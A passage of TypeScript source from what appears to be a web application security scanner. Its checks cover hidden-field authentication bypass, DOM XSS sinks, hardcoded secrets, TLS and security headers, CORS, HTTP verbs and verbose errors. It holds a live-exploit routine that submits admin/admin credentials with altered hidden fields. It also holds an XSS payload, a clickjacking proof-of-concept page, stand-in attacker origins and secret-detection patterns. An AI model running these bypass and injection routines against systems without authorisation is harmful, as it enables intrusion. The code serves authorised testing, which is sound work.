                evidence: `${label} found in authenticated page body: "${match[0].slice(0, 120)}"`,
              });
            }
          }
        } catch { /* non-critical */ }
      }

    } catch (err: any) {
      console.error(`[AuthScan] Error scanning page ${pageUrl}: ${err.message}`);
    }
  }

  const totalFindings = findings.length;
  scanState.currentTest = `[AUTH] Authenticated scan complete — ${totalFindings} finding(s) from ${authVisited.size} pages`;
  console.error(`[AuthScan] Done. ${totalFindings} finding(s) across ${authVisited.size} pages.`);
  // Leave browser on the post-auth landing page so user can see the authenticated area
  await navLive(postAuthUrl).catch(() => {});
  return findings;
}

// ── Live browser exploitation of hidden field bypass ────────────────────────
// When a suspicious hidden field is detected (e.g. mode=0), this function
// actually drives the browser live so the user can watch the exploit happen:
//   1. Navigate to the form page
//   2. Set the hidden field to the bypass value
//   3. Click submit
//   4. Scan the resulting page and push findings to the HUD
async function liveExploitHiddenField(
  formUrl: string,
  fieldName: string,
  originalValue: string,
  bypassValues: string[]
): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  console.error(`[LiveExploit] Attempting hidden field bypass: ${fieldName}=${bypassValues.join(",")} on ${formUrl}`);

  for (const bypassVal of bypassValues) {
    try {
      // Step 1 — Navigate browser to the form page so user can watch
      scanState.currentTest = `[LIVE] Navigating to ${formUrl} for hidden field bypass (${fieldName}=${bypassVal})`;
      await sendExtensionCommand("browser_action", { action: "navigate", url: formUrl }, 10000);
      await new Promise(r => setTimeout(r, 1500)); // let page settle

      // Step 2 — Try two strategies to set the hidden field and submit:
      //   Strategy A: mutate the DOM hidden field + click submit (visible in browser)
      //   Strategy B: direct HTTP POST with the bypass value (fallback, routed through Burp)

      let landedUrl: string = formUrl;
      let bodySnippet = "";

      // Strategy A — DOM mutation
      // Use smart_fill_form with the hidden field as target: this fills ALL visible
      // credential fields (username, password) with benign test values AND sets the
      // hidden field to the bypass value via the proven nativeSet + event-dispatch path.
      scanState.currentTest = `[LIVE] Filling credentials + setting ${fieldName}=${bypassVal} in browser DOM`;
      try {
        await sendExtensionCommand("browser_action", {
          action: "smart_fill_form",
          targetSelector: `input[name="${fieldName}"]`,
          payload: bypassVal,
          includeHidden: true,   // also force-sets hidden inputs matching targetSelector
        }, 8000);
      } catch {
        // Fallback: fill creds first, then set hidden field separately
        try {
          await sendExtensionCommand("browser_action", { action: "smart_fill_form" }, 6000);
        } catch { /* ignore */ }
        try {
          await sendExtensionCommand("execute_script", {
            script: `(function(){
              var el = document.querySelector('input[name=${JSON.stringify(fieldName)}]');
              if (!el) return;
              var setter = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value')?.set;
              if (setter) setter.call(el, ${JSON.stringify(bypassVal)});
              else el.value = ${JSON.stringify(bypassVal)};
              el.dispatchEvent(new Event('input', { bubbles: true }));
              el.dispatchEvent(new Event('change', { bubbles: true }));
            })();`,
          }, 6000);
        } catch { /* fall through to Strategy B */ }
      }

      // Strategy A2 — fetch-based form submit (Vue SPAs sometimes ignore DOM mutations
      // and build their own POST from reactive state; reading FormData includes hidden inputs).
      // Submit via browser fetch so session cookie is set in the browser.
      scanState.currentTest = `[LIVE] Submitting form with ${fieldName}=${bypassVal} via fetch`;
      let fetchNavigated = false;
      try {
        const fetchResult = await sendExtensionCommand("execute_script", {
          script: `(function(){
            var form = document.querySelector('form');
            if (!form) return null;
            var fd = new FormData(form);
            fd.set(${JSON.stringify(fieldName)}, ${JSON.stringify(bypassVal)});
            var body = new URLSearchParams(fd).toString();
            var action = form.action || window.location.href;
            return fetch(action, {
              method: 'POST',
              headers: {'Content-Type': 'application/x-www-form-urlencoded'},
              body: body,
              credentials: 'include',
              redirect: 'follow'
            }).then(function(r){ return r.url || r.redirected ? r.url : null; });
          })();`,
        }, 12000).catch(() => null);
        const redirectUrl = fetchResult?.value;
        if (redirectUrl && redirectUrl !== formUrl && typeof redirectUrl === "string" && redirectUrl.includes("/")) {
          // fetch followed redirect — navigate the browser there to set session
          await sendExtensionCommand("browser_action", { action: "navigate", url: redirectUrl }, 10000).catch(() => {});
          await new Promise(r => setTimeout(r, 2500));
          fetchNavigated = true;
          console.error(`[LiveExploit] fetch redirect → ${redirectUrl}`);
        }
      } catch { /* ignore */ }

      // Step 3 — fallback button-click submit (if fetch didn't navigate)
      if (!fetchNavigated) {
        scanState.currentTest = `[LIVE] Submitting form with ${fieldName}=${bypassVal}`;
        await sendExtensionCommand("browser_action", {
          action: "click",
          selector: 'input[type="submit"], button[type="submit"], button:not([type])',
        }, 10000).catch(() => null);
      }

      // Step 4 — Wait for navigation / response
      await new Promise(r => setTimeout(r, 2000));

      // Step 5 — Check where we ended up after DOM approach
      const postNav = await sendExtensionCommand("get_url", {}, 5000).catch(() => null);
      landedUrl = postNav?.url ?? formUrl;

      // Strategy B — Direct HTTP POST (if DOM approach didn't navigate away)
      if (landedUrl === formUrl) {
        scanState.currentTest = `[LIVE] Direct POST ${fieldName}=${bypassVal} via HTTP`;
        try {
          // Include test credentials so the server can reach the mode-check code path.
          // If mode=1 is a true bypass, credentials are irrelevant; if not, we still
          // see the "Invalid credentials" response and correctly skip confirmation.
          const resp = await sendRequestThroughBurp(
            "POST",
            formUrl,
            { "Content-Type": "application/x-www-form-urlencoded" },
            `username=admin&password=admin&${fieldName}=${encodeURIComponent(bypassVal)}`
          );
          // Follow redirect: 301/302 → Location header gives us the post-auth URL
          const location = resp.headers?.["location"] || resp.headers?.["Location"] || "";
          if (resp.status >= 300 && resp.status < 400 && location) {
            const absLocation = location.startsWith("http") ? location : new URL(location, formUrl).href;
            landedUrl = absLocation;
            // Navigate browser live to the confirmed post-auth page — await so user sees it
            scanState.currentTest = `[LIVE] ✅ Bypass confirmed! Navigating live to ${absLocation}`;
            await sendExtensionCommand("browser_action", { action: "navigate", url: absLocation }, 10000).catch(() => {});
            await new Promise(r => setTimeout(r, 3000)); // hold so user can see the bypass
            const postText2 = await sendExtensionCommand("browser_action", { action: "extract_text", selector: "body" }, 6000).catch(() => null);
            bodySnippet = (postText2?.text ?? "").slice(0, 300).replace(/\s+/g, " ").trim();
          } else if (resp.status === 200 && resp.body.length > 50) {
            // Some apps don't redirect — check if response body changed (no login form)
            if (!/login|sign in|unauthorized|password/i.test(resp.body.slice(0, 400))) {
              landedUrl = formUrl + `?bypass=${bypassVal}`;
              bodySnippet = resp.body.slice(0, 300).replace(/\s+/g, " ").trim();
            }
          }
        } catch (postErr: any) {
          console.error(`[LiveExploit] Direct POST failed: ${postErr.message}`);
        }
      } else {
        const pageText = await sendExtensionCommand("browser_action", { action: "extract_text", selector: "body" }, 6000).catch(() => null);
        bodySnippet = (pageText?.text ?? "").slice(0, 300).replace(/\s+/g, " ").trim();
      }

      if (landedUrl !== formUrl || (bodySnippet && !/login|sign in|incorrect|invalid|error/i.test(bodySnippet))) {
        const finding: PassiveFinding = {
          type: "Auth Bypass via Hidden Field (Confirmed)",
          severity: "Critical",
          endpoint: `POST ${formUrl}`,
          param: `hidden:${fieldName}`,
          payload: `${fieldName}=${bypassVal} (was: ${fieldName}=${originalValue})`,
          evidence: `LIVE EXPLOIT CONFIRMED — Submitting with ${fieldName}=${bypassVal} redirected to "${landedUrl}". Body snippet: "${bodySnippet}". Authentication was bypassed by changing a hidden form field.`,
        };
        findings.push(finding);

        // Push to HUD so user sees it highlighted in the browser
        await sendExtensionCommand("hud-push", { findings: [finding] }, 3000).catch(() => null);

        // Send to Burp Repeater
        const formUrlParsed = new URL(formUrl);
        await sendFindingToBurp(
          "Critical",
          `Auth Bypass — ${fieldName}=${bypassVal}`,
          "POST",
          formUrl,
          { "Content-Type": "application/x-www-form-urlencoded" },
          `${fieldName}=${bypassVal}`
        );

        console.error(`[LiveExploit] ✅ CONFIRMED bypass: ${fieldName}=${bypassVal} → landed on ${landedUrl}`);
        // Don't bother trying more bypass values if one worked
        break;
      } else {
        console.error(`[LiveExploit] ❌ ${fieldName}=${bypassVal} — no bypass (stayed at ${landedUrl})`);
      }
    } catch (err: any) {
      console.error(`[LiveExploit] Error during live exploit (${fieldName}=${bypassVal}):`, err.message);
    }
  }

  return findings;
}

// ── Client-side source code analysis ────────────────────────────────────────
// Detects: hidden field auth bypass, innerHTML XSS sinks, hardcoded secrets,
// client-side auth logic, JS-extracted API endpoints, open redirect params
async function checkClientSideSource(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];

  let html = "";
  // Queue browser navigation for visibility (fire-and-forget via nav drainer)
  liveShow(url);
  try {
    // Prefer browser page source (includes JS-rendered content)
    const src = await sendExtensionCommand("browser_action", { action: "get_page_source" }, 8000);
    html = String(src?.source || src?.result?.source || src?.html || src?.result?.html || "");
  } catch { /* fall through to server-side fetch */ }
  if (!html) {
    try {
      const r = await sendRequestFallbackCached("GET", url);
      html = r.body;
    } catch {
      return findings;
    }
  }

  // 1. Suspicious hidden form fields (auth bypass candidates)
  const SUSPICIOUS_HIDDEN = /type=["']hidden["'][^>]*name=["']([^"']+)["'][^>]*value=["']([^"']*)["']/gi;
  const BYPASS_NAMES = /^(mode|debug|admin|bypass|role|privileged|internal|test|skip|override|dev|backdoor|auth|authenticated|logged_in|level|access|tier|grant)$/i;
  let m: RegExpExecArray | null;
  while ((m = SUSPICIOUS_HIDDEN.exec(html)) !== null) {
    const name = m[1], value = m[2];
    if (BYPASS_NAMES.test(name)) {
      findings.push({
        type: "Suspicious Hidden Form Field",
        severity: "High",
        endpoint: `POST ${url}`,
        param: `hidden:${name}`,
        payload: `${name}=1 (was: ${name}=${value})`,
        evidence: `Hidden field "${name}" with value "${value}" — commonly used in client-side auth bypass. Try submitting with altered value (e.g. mode=1, admin=true, role=admin).`,
      });
    }
  }

  // Also check reversed attribute order (value before name)
  const REVERSED = /type=["']hidden["'][^>]*value=["']([^"']*)["'][^>]*name=["']([^"']+)["']/gi;
  while ((m = REVERSED.exec(html)) !== null) {
    const value = m[1], name = m[2];
    if (BYPASS_NAMES.test(name)) {
      findings.push({
        type: "Suspicious Hidden Form Field",
        severity: "High",
        endpoint: `POST ${url}`,
        param: `hidden:${name}`,
        payload: `${name}=1 (was: ${name}=${value})`,
        evidence: `Hidden field "${name}" with value "${value}" — client-side auth bypass candidate.`,
      });
    }
  }

  // 2b. LIVE-DOM hidden field check — catches Vue/React/SPA-rendered hidden
  // inputs that don't appear in raw HTML. Only fires when a browser tab is
  // attached and the page is loaded; failures are silently ignored.
  try {
    const liveResult: any = await Promise.race([
      sendExtensionCommand("browser_action", { action: "query_elements", selector: "input[type='hidden']" }, 4000),
      new Promise((_, rej) => setTimeout(() => rej(new Error("live-dom timeout")), 4500)),
    ]);
    const liveElems: any[] = liveResult?.elements || [];
    const seenLive = new Set<string>();
    for (const el of liveElems) {
      const nm = String(el?.name || "").trim();
      if (!nm || seenLive.has(nm)) continue;
      seenLive.add(nm);
      if (!BYPASS_NAMES.test(nm)) continue;
      // De-dupe against raw-HTML findings (same param name already flagged)
      if (findings.some((f) => f.type === "Suspicious Hidden Form Field" && f.param === `hidden:${nm}`)) continue;
      const val = String(el?.value ?? "");
      findings.push({
        type: "Suspicious Hidden Form Field",
        severity: "High",
        endpoint: `POST ${url}`,
        param: `hidden:${nm}`,
        payload: `${nm}=1 (was: ${nm}=${val})`,
        evidence: `Live-DOM hidden field "${nm}" with value "${val}" (rendered by client-side framework; not in raw HTML). Client-side auth bypass candidate — try mode=1, admin=true, role=admin.`,
      });
    }
  } catch {
    // No browser attached, scan-only mode, or timeout — fall back to raw HTML only.
  }

  // 2. innerHTML / document.write XSS sinks in inline JS
  const INNER_HTML_SINK = /(\w[\w.]*)\s*\.\s*innerHTML\s*=\s*([^;]{1,120})/g;
  const DOCUMENT_WRITE = /document\.write\s*\(/g;
  const OUTER_HTML_SINK = /(\w[\w.]*)\s*\.\s*outerHTML\s*=\s*([^;]{1,120})/g;
  const UNSAFE_SINKS: Array<{regex: RegExp; label: string}> = [
    { regex: INNER_HTML_SINK, label: "innerHTML" },
    { regex: OUTER_HTML_SINK, label: "outerHTML" },
    { regex: DOCUMENT_WRITE, label: "document.write" },
  ];

  // Extract inline scripts
  const scriptContents: string[] = [];
  const SCRIPT_TAGS = /<script[^>]*>([\s\S]*?)<\/script>/gi;
  while ((m = SCRIPT_TAGS.exec(html)) !== null) {
    scriptContents.push(m[1]);
  }
  const inlineJs = scriptContents.join("\n");

  for (const { regex, label } of UNSAFE_SINKS) {
    const sinkMatches = inlineJs.matchAll(new RegExp(regex.source, "gi"));
    for (const sm of sinkMatches) {
      const context = sm[0].substring(0, 120);
      // Only flag if the RHS includes a variable (not a pure string literal)
      if (!/=\s*["'`][^"'`]*["'`]\s*;/.test(sm[0])) {
        findings.push({
          type: "Unsafe DOM Sink (Potential XSS)",
          severity: "Medium",
          endpoint: `GET ${url}`,
          param: label,
          payload: `<img src=x onerror=alert(document.cookie)>`,
          evidence: `Inline JS uses "${label}" with dynamic content: ${context.trim()}. Sink confirmed — escalates to High once a controlled input source is demonstrated, Critical after data exfiltration is shown.`,
        });
        break; // one finding per sink type per page
      }
    }
  }

  // 3. JS-extracted API endpoints (fetch/XHR/axios calls)
  const API_CALLS = /(?:fetch|axios(?:\.get|\.post|\.put|\.delete)?|XMLHttpRequest|\.open)\s*\(\s*["'`]([^"'`\s)]{3,100})["'`]/g;
  const discoveredEndpoints = new Set<string>();
  while ((m = API_CALLS.exec(inlineJs)) !== null) {
    const ep = m[1];
    if (ep.startsWith("/") || ep.startsWith("http")) {
      discoveredEndpoints.add(ep);
    }
  }
  if (discoveredEndpoints.size > 0) {
    findings.push({
      type: "JS-Extracted API Endpoints",
      severity: "Info",
      endpoint: `GET ${url}`,
      param: "inline-js",
      payload: [...discoveredEndpoints].join(", "),
      evidence: `Found ${discoveredEndpoints.size} API endpoint(s) in inline JavaScript: ${[...discoveredEndpoints].join(", ")}. These endpoints may be unprotected or expose additional attack surface.`,
    });
  }

  // 4. Hardcoded secrets/tokens in inline JS
  const SECRET_PATTERNS = [
    { name: "API Key", regex: /(?:api[_-]?key|apikey|api_token)\s*[:=]\s*["'`]([A-Za-z0-9_\-]{16,64})["'`]/gi },
    { name: "Bearer Token", regex: /bearer\s+([A-Za-z0-9._\-]{20,})["'`\s]/gi },
    { name: "Hardcoded Password", regex: /(?:password|passwd|pwd|secret)\s*[:=]\s*["'`]([^"'`\s]{6,})["'`]/gi },
    { name: "JWT", regex: /["'`](eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})["'`]/g },
  ];
  for (const { name, regex } of SECRET_PATTERNS) {
    const match = regex.exec(inlineJs);
    if (match) {
      findings.push({
        type: `Hardcoded Secret in JS (${name})`,
        severity: "High",
        endpoint: `GET ${url}`,
        param: "inline-js",
        payload: match[0].substring(0, 80),
        evidence: `Potential hardcoded ${name} found in inline JavaScript: "${match[0].substring(0, 80)}". Client-side secrets are fully visible to attackers.`,
      });
    }
  }

  // 5. Client-side authentication / access control logic
  const CLIENT_AUTH = /(?:if\s*\([^)]*(?:mode|role|admin|auth|logged|level|access)\s*[=!<>]+\s*|localStorage\.getItem\s*\(["'][^"']*(?:token|auth|session))/gi;
  if (CLIENT_AUTH.test(inlineJs)) {
    findings.push({
      type: "Client-Side Access Control Logic",
      severity: "Medium",
      endpoint: `GET ${url}`,
      param: "inline-js",
      payload: "",
      evidence: `JavaScript contains conditional logic based on auth/role/mode values. Access control decisions made in the browser can be bypassed by manipulating form fields, localStorage, or URL parameters.`,
    });
  }

  // 6. Open redirect sinks in JS (window.location = user-controlled)
  const REDIRECT_SINK = /window\.location(?:\.href)?\s*=\s*(?!["'`][^"'`]*["'`])/g;
  if (REDIRECT_SINK.test(inlineJs)) {
    findings.push({
      type: "Open Redirect Sink in JS",
      severity: "Low",
      endpoint: `GET ${url}`,
      param: "window.location",
      payload: "//attacker.com",
      evidence: `JavaScript assigns dynamic value to window.location. Sink pattern detected — escalates to Medium once a confirmed user-controlled source is demonstrated.`,
    });
  }

  // 7. Also fetch external JS files referenced in HTML
  const JS_SRCS = /\bsrc=["']([^"']+\.js[^"']*)["']/gi;
  const jsUrls: string[] = [];
  while ((m = JS_SRCS.exec(html)) !== null) {
    const src = m[1];
    try {
      const resolved = src.startsWith("http") ? src : new URL(src, url).href;
      const srcOrigin = new URL(resolved).origin;
      const pageOrigin = new URL(url).origin;
      if (srcOrigin === pageOrigin) jsUrls.push(resolved);
    } catch { /* ignore */ }
  }
  for (const jsUrl of jsUrls.slice(0, 10)) {
    try {
      const r = await sendRequestFallbackCached("GET", jsUrl);
      const extJs = r.body;
      // Re-check sinks in external JS
      for (const { regex, label } of UNSAFE_SINKS) {
        const sinkMatches = extJs.matchAll(new RegExp(regex.source, "gi"));
        for (const sm of sinkMatches) {
          if (!/=\s*["'`][^"'`]*["'`]\s*;/.test(sm[0])) {
            findings.push({
              type: "Unsafe DOM Sink in External JS",
              severity: "High",
              endpoint: jsUrl,
              param: label,
              payload: `<img src=x onerror=alert(document.cookie)>`,
              evidence: `External JS file uses "${label}" with dynamic content: ${sm[0].substring(0, 120).trim()}`,
            });
            break;
          }
        }
      }
    } catch { /* skip */ }
  }

  return findings;
}

// ── A02: TLS / Transport checks ──────────────────────────────────────────────
async function checkTLS(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const parsedUrl = new URL(url);

  // Navigate browser to show activity during TLS/transport checks
  liveShow(url);

  // 1. HTTP → HTTPS redirect check
  if (parsedUrl.protocol === "https:") {
    const httpUrl = url.replace(/^https:/, "http:");
    try {
      const r = await sendRequestFallback("GET", httpUrl);
      const location = r.headers["location"] || "";
      if (r.status >= 300 && r.status < 400 && /^https:/i.test(location)) {
        // Good — redirects to HTTPS
      } else if (r.status < 400) {
        findings.push({
          type: "HTTP Access Without Redirect",
          severity: "High",
          endpoint: `GET ${httpUrl}`,
          param: "protocol",
          payload: httpUrl,
          evidence: `HTTP request returned status ${r.status} without redirecting to HTTPS. Sensitive data may be transmitted in cleartext.`,
        });
      }
    } catch {
      // HTTP port may be closed — that's fine
    }
  }

  // 2. HSTS header quality check
  try {
    const r = await sendRequestFallbackCached("GET", url);
    const hsts = r.headers["strict-transport-security"] || "";
    if (!hsts) {
      findings.push({
        type: "Missing HSTS Header",
        severity: "Low",
        endpoint: `GET ${url}`,
        param: "strict-transport-security",
        payload: "",
        evidence: "Strict-Transport-Security header is absent. Browsers will not enforce HTTPS-only connections.",
      });
    } else {
      // Check max-age is at least 1 year (31536000)
      const maxAgeMatch = hsts.match(/max-age=(\d+)/i);
      const maxAge = maxAgeMatch ? parseInt(maxAgeMatch[1], 10) : 0;
      if (maxAge < 31536000) {
        findings.push({
          type: "Weak HSTS max-age",
          severity: "Low",
          endpoint: `GET ${url}`,
          param: "strict-transport-security",
          payload: "",
          evidence: `HSTS max-age=${maxAge} is less than 1 year (31536000). Value: ${hsts}`,
        });
      }
      if (!/includeSubDomains/i.test(hsts)) {
        findings.push({
          type: "HSTS Missing includeSubDomains",
          severity: "Low",
          endpoint: `GET ${url}`,
          param: "strict-transport-security",
          payload: "",
          evidence: `HSTS does not include 'includeSubDomains'. Subdomains remain vulnerable. Value: ${hsts}`,
        });
      }
    }

    // 3. Sensitive data in plain HTTP (check if the page itself uses http:// for resources)
    if (/src=["']http:\/\//i.test(r.body) || /href=["']http:\/\//i.test(r.body)) {
      findings.push({
        type: "Mixed Content",
        severity: "Medium",
        endpoint: `GET ${url}`,
        param: "mixed-content",
        payload: "",
        evidence: "Page loads subresources over HTTP (mixed content). Attackers on the network can intercept or tamper with these resources.",
      });
    }
  } catch (err: any) {
    console.error("[TLS Check] Failed:", err.message);
  }

  return findings;
}

// ── A05: Security headers + clickjacking PoC ─────────────────────────────────
async function checkSecurityHeaders(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];

  // Navigate browser to show activity while headers are read server-side
  liveShow(url);
  let resp: { status: number; headers: Record<string, string>; body: string; viaProxy: boolean };
  try {
    resp = await sendRequestFallbackCached("GET", url);
  } catch (err: any) {
    console.error("[Headers Check] Request failed:", err.message);
    return findings;
  }

  console.error(`[Headers Check] Got ${resp.status} via ${resp.viaProxy ? "Burp proxy" : "direct"}, headers: ${JSON.stringify(Object.keys(resp.headers))}`);

  const h = (name: string) => (resp.headers[name.toLowerCase()] || "").toLowerCase();

  const checks: Array<{
    header: string;
    severity: PassiveFinding["severity"];
    evidence: string;
  }> = [
    {
      header: "x-frame-options",
      severity: "Low",
      evidence: "Missing X-Frame-Options. The page can be embedded in an iframe by any site, enabling clickjacking attacks.",
    },
    {
      header: "x-content-type-options",
      severity: "Low",
      evidence: "Missing X-Content-Type-Options: nosniff. Browsers may MIME-sniff responses, enabling content injection attacks.",
    },
    {
      header: "content-security-policy",
      severity: "Low",
      evidence: "Missing Content-Security-Policy. No restrictions on script sources — XSS payloads can load arbitrary scripts.",
    },
    {
      header: "referrer-policy",
      severity: "Low",
      evidence: "Missing Referrer-Policy. Sensitive URL parameters may be leaked to third parties via the Referer header.",
    },
    {
      header: "permissions-policy",
      severity: "Low",
      evidence: "Missing Permissions-Policy. Browser features (camera, microphone, geolocation) are unrestricted.",
    },
  ];

  const presentHeaders = Object.keys(resp.headers).map((k) => k.toLowerCase());
  let missingXFrame = false;
  let missingCSP = false;

  for (const check of checks) {
    if (!presentHeaders.includes(check.header)) {
      if (check.header === "x-frame-options") missingXFrame = true;
      if (check.header === "content-security-policy") missingCSP = true;
      findings.push({
        type: "Missing Security Header",
        severity: check.severity,
        endpoint: `GET ${url}`,
        param: check.header,
        payload: "",
        evidence: check.evidence,
      });
    }
  }

  // Check CSP frame-ancestors if CSP is present but no frame-ancestors
  if (!missingCSP) {
    const csp = h("content-security-policy");
    if (!/frame-ancestors/i.test(csp)) {
      missingXFrame = true;
      findings.push({
        type: "CSP Missing frame-ancestors",
        severity: "Low",
        endpoint: `GET ${url}`,
        param: "content-security-policy",
        payload: "",
        evidence: `CSP is present but lacks frame-ancestors directive. Page may still be embeddable. CSP: ${resp.headers["content-security-policy"]}`,
      });
    }
  }

  // Generate clickjacking PoC if page is embeddable
  if (missingXFrame || missingCSP) {
    const poc = `<!DOCTYPE html>
<html>
<head><title>Clickjacking PoC — GhostCrawler</title>
<style>
  body { font-family: sans-serif; background:#1a1a2e; color:#eee; text-align:center; padding:20px; }
  h1 { color:#e94560; }
  .wrapper { position:relative; width:800px; height:600px; margin:0 auto; }
  iframe { width:100%; height:100%; border:2px solid #e94560; }
  .overlay { position:absolute; top:0;left:0;width:100%;height:100%;
             background:rgba(255,0,0,0.08); pointer-events:none; }
  .note { margin-top:10px; color:#aaa; font-size:13px; }
</style>
</head>
<body>
  <h1>🎯 Clickjacking PoC</h1>
  <p>Target: <strong>${url}</strong></p>
  <p>This page embeds the target in a transparent iframe. An attacker can overlay deceptive UI on top to trick users into performing unintended actions.</p>
  <div class="wrapper">
    <iframe src="${url}" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
    <div class="overlay"></div>
  </div>
  <p class="note">Generated by GhostCrawler | OWASP A05 — Security Misconfiguration</p>
  <p class="note">Fix: Add <code>X-Frame-Options: DENY</code> or <code>Content-Security-Policy: frame-ancestors 'none'</code></p>
</body>
</html>`;
    findings.push({
      type: "Clickjacking",
      severity: "Low",
      endpoint: `GET ${url}`,
      param: "x-frame-options / csp frame-ancestors",
      payload: `<iframe src="${url}">`,
      evidence: `Page can be embedded in an iframe. No X-Frame-Options or CSP frame-ancestors found. Escalates to Medium if state-changing actions (login, settings, payments) are accessible while framed.`,
      poc,
    });
  }

  return findings;
}

// ── A05: CORS misconfiguration ────────────────────────────────────────────────
async function checkCORS(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const evilOrigin = "https://evil-attacker.com";

  // Navigate browser to show activity (CORS test uses custom Origin — must be server-side)
  liveShow(url);
  try {
    const r = await sendRequestFallback("GET", url, { Origin: evilOrigin });
    const acao = r.headers["access-control-allow-origin"] || "";
    const acac = r.headers["access-control-allow-credentials"] || "";

    if (acao === "*") {
      findings.push({
        type: "CORS Wildcard",
        severity: "Medium",
        endpoint: `GET ${url}`,
        param: "access-control-allow-origin",
        payload: `Origin: ${evilOrigin}`,
        evidence: `Access-Control-Allow-Origin: * — any origin can read cross-origin responses. Sensitive data may be exposed to attacker-controlled sites.`,
      });
    } else if (acao.toLowerCase() === evilOrigin.toLowerCase()) {
      const severity: PassiveFinding["severity"] = /true/i.test(acac) ? "Critical" : "High";
      findings.push({
        type: "CORS Origin Reflection" + (/true/i.test(acac) ? " + Credentials" : ""),
        severity,
        endpoint: `GET ${url}`,
        param: "access-control-allow-origin",
        payload: `Origin: ${evilOrigin}`,
        evidence: `Server reflects arbitrary Origin header. ACAO: ${acao}, ACAC: ${acac || "not set"}. Attacker can read authenticated responses from any origin.`,
      });
    }

    // Also test preflight
    const pre = await sendRequestFallback("OPTIONS", url, {
      Origin: evilOrigin,
      "Access-Control-Request-Method": "POST",
      "Access-Control-Request-Headers": "Authorization, Content-Type",
    });
    const preAcao = pre.headers["access-control-allow-origin"] || "";
    const preAcah = pre.headers["access-control-allow-headers"] || "";
    if (/authorization/i.test(preAcah) && preAcao !== "") {
      findings.push({
        type: "CORS Allows Authorization Header",
        severity: "High",
        endpoint: `OPTIONS ${url}`,
        param: "access-control-allow-headers",
        payload: `Origin: ${evilOrigin}, ACRH: Authorization`,
        evidence: `Preflight allows Authorization header from arbitrary origins. ACAO: ${preAcao}, ACAH: ${preAcah}`,
      });
    }
  } catch (err: any) {
    console.error("[CORS Check] Failed:", err.message);
  }

  return findings;
}

// ── A05: HTTP verb tampering ──────────────────────────────────────────────────
async function checkHTTPVerbs(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];
  const dangerousVerbs = ["PUT", "DELETE", "PATCH", "TRACE", "CONNECT"];

  // Navigate browser to show activity (verb tampering requires non-standard methods — server-side)
  liveShow(url);
  try {
    // First get baseline GET response code (use cache — likely already fetched by security headers check)
    const baseline = await sendRequestFallbackCached("GET", url);
    const baselineStatus = baseline.status;

    for (const verb of dangerousVerbs) {
      try {
        const r = await sendRequestFallback(verb, url);
        if (verb === "TRACE" && r.status === 200) {
          findings.push({
            type: "TRACE Method Enabled (XST)",
            severity: "Low",
            endpoint: `TRACE ${url}`,
            param: "method",
            payload: `TRACE ${url} HTTP/1.1`,
            evidence: `TRACE method returned ${r.status}. Enables Cross-Site Tracing (XST) — attacker can read HttpOnly cookies via JavaScript in some configurations.`,
          });
        } else if (verb === "PUT" && r.status < 400) {
          findings.push({
            type: "PUT Method Allowed",
            severity: "High",
            endpoint: `PUT ${url}`,
            param: "method",
            payload: `PUT ${url} HTTP/1.1`,
            evidence: `PUT method returned ${r.status} (baseline GET: ${baselineStatus}). May allow file upload or content replacement.`,
          });
        } else if (verb === "DELETE" && r.status < 400) {
          findings.push({
            type: "DELETE Method Allowed",
            severity: "High",
            endpoint: `DELETE ${url}`,
            param: "method",
            payload: `DELETE ${url} HTTP/1.1`,
            evidence: `DELETE method returned ${r.status} (baseline GET: ${baselineStatus}). May allow resource deletion without proper authorization.`,
          });
        }
      } catch {
        // Verb not supported — expected
      }
    }

    // OPTIONS — check which methods are advertised
    try {
      const opts = await sendRequestFallback("OPTIONS", url);
      const allow = opts.headers["allow"] || opts.headers["access-control-allow-methods"] || "";
      if (/PUT|DELETE|TRACE|CONNECT/i.test(allow)) {
        findings.push({
          type: "Dangerous HTTP Methods in Allow Header",
          severity: "Medium",
          endpoint: `OPTIONS ${url}`,
          param: "allow",
          payload: `OPTIONS ${url} HTTP/1.1`,
          evidence: `OPTIONS response advertises dangerous methods: ${allow}`,
        });
      }
    } catch {
      // OPTIONS not supported
    }
  } catch (err: any) {
    console.error("[Verb Check] Failed:", err.message);
  }

  return findings;
}

// ── A05: Verbose error messages ───────────────────────────────────────────────
async function checkVerboseErrors(url: string): Promise<PassiveFinding[]> {
  const findings: PassiveFinding[] = [];

  const errorProbes: Array<{ path: string; description: string }> = [
    { path: "/?id=1'", description: "SQL quote in query param" },
    { path: "/nonexistent-page-xyzabc123", description: "Non-existent path" },
    { path: "/?debug=true", description: "Debug parameter" },
    { path: "/?q=<script>", description: "XSS in query param" },
    { path: "/", description: "Baseline (Accept: invalid/type)" },
  ];

  const stackTracePatterns = [
    { pattern: /at\s+\w+[\w.]*\s+\([^)]+:\d+:\d+\)/i, label: "Node.js stack trace" },
    { pattern: /Traceback \(most recent call last\)/i, label: "Python traceback" },
    { pattern: /Exception in thread|java\.lang\.|at \w+\.\w+\.\w+\([\w.]+\.java:\d+\)/i, label: "Java stack trace" },
    { pattern: /Fatal error|Warning:.*on line \d+|Parse error/i, label: "PHP error" },
    { pattern: /System\.Exception|StackTrace:|at System\./i, label: ".NET stack trace" },
    { pattern: /ActiveRecord::|ActionController::|undefined method/i, label: "Ruby/Rails error" },
    { pattern: /SQL syntax.*MySQL|ORA-\d{5}|Microsoft OLE DB|ODBC.*Error|PG::SyntaxError/i, label: "SQL error message" },
    { pattern: /nginx\/[\d.]+|Apache\/[\d.]+|PHP\/[\d.]+/i, label: "Version disclosure in error" },
  ];

  const parsedUrl = new URL(url);

  for (const probe of errorProbes) {
    try {
      const probeUrl = probe.path === "/"
        ? url
        : `${parsedUrl.origin}${probe.path}`;

      const headers: Record<string, string> = probe.path === "/"
        ? { Accept: "invalid/type-xyz" }
        : {};

      // Navigate browser to probe URL so user sees activity
      liveShow(probeUrl);
      const r = await sendRequestFallback("GET", probeUrl, headers);

      for (const { pattern, label } of stackTracePatterns) {
        if (pattern.test(r.body)) {
          const excerpt = r.body.match(pattern)?.[0]?.slice(0, 200) || "";
          findings.push({
            type: "Verbose Error Message",
            severity: "Medium",
